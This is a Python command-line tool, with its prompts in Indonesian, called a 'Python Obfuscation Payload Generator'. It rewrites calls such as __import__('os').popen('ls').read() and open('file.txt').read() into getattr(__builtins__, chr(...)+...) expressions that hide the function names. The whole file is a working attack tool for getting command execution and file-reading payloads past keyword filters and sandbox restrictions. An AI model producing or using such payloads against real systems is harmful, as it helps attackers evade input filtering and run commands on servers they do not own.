import re 

def string_to_chr(input_string: str) -> str:
    if not input_string:
        return ""
    chr_parts = [f"chr({ord(char)})" for char in input_string]
    return "+".join(chr_parts)

def generate_simple_payload(command: str) -> str:
    try:
        main_part, method_part = command.rsplit('.', 1)
        method_name = method_part.replace('()', '')
        func_name, args_part = main_part.split('(', 1)
        argument = args_part.strip().strip("')\"")

        print("\n[+] Parsing (Mode Sederhana) berhasil:")
        print(f"    - Fungsi Utama: {func_name}")
        print(f"    - Argumen     : {argument}")
        print(f"    - Metode      : {method_name}")

        obfuscated_func = string_to_chr(func_name)
        obfuscated_arg = string_to_chr(argument)
        obfuscated_method = string_to_chr(method_name)

        final_payload = (
            f"getattr(__builtins__, {obfuscated_func})"
            f"({obfuscated_arg})."
            f"__getattribute__({obfuscated_method})()"
        )
        return final_payload
    except Exception as e:
        return f"Error (Sederhana): Format salah. Contoh: open('file.txt').read(). Detail: {e}"

def generate_advanced_payload(command: str) -> str:
    pattern = r"^([\w_]+)\(['\"]([^'\"]+)['\"]\)\.([\w_]+)\(['\"]([^'\"]+)['\"]\)\.([\w_]+)\(\)$"
    match = re.match(pattern, command.strip())
    if not match:
        return "Error (Lanjutan): Format tidak cocok dengan pola. Contoh: __import__('os').popen('ls').read()"
    func1, arg1, func2, arg2, func3 = match.groups()
    print("\n[+] Parsing (Mode Lanjutan) berhasil:")
    print(f"    - Fungsi 1: {func1} (Arg: {arg1})")
    print(f"    - Fungsi 2: {func2} (Arg: {arg2})")
    print(f"    - Fungsi 3: {func3}")
    chr_f1 = string_to_chr(func1)
    chr_arg1 = string_to_chr(arg1)
    chr_f2 = string_to_chr(func2)
    chr_arg2 = string_to_chr(arg2)
    chr_f3 = string_to_chr(func3)
    final_payload = (
        f"getattr(__builtins__, {chr_f1})({chr_arg1})."
        f"__getattribute__({chr_f2})({chr_arg2})."
        f"__getattribute__({chr_f3})()"
    )
    return final_payload

if __name__ == "__main__":
    print("==========================================")
    print("==   Python Obfuscation Payload Generator   ==")
    print("==                  v3.0                  ==")
    print("==========================================")
    try:
        while True:
            print("\nPilih mode generator:")
            print("  1. Mode Sederhana (misal: open('file.txt').read())")
            print("  2. Mode Lanjutan  (misal: __import__('os').popen('ls').read())")
            print("  (Ketik 'exit' atau 'quit' untuk keluar)")
            mode = input("Pilihan mode (1 atau 2) > ")
            if mode.lower() in ['exit', 'quit']:
                break
            if mode == '1':
                command = input("Masukkan perintah sederhana > ")
                payload = generate_simple_payload(command)
            elif mode == '2':
                command = input("Masukkan perintah lanjutan > ")
                payload = generate_advanced_payload(command)
            else:
                print("Pilihan tidak valid. Silakan pilih 1 atau 2.")
                continue
            print("\n✅ Payload Anda Siap:")
            print("------------------------------------------")
            print(payload)
            print("------------------------------------------")
    except KeyboardInterrupt:
        print("\nTerima kasih telah menggunakan generator ini. Sampai jumpa!")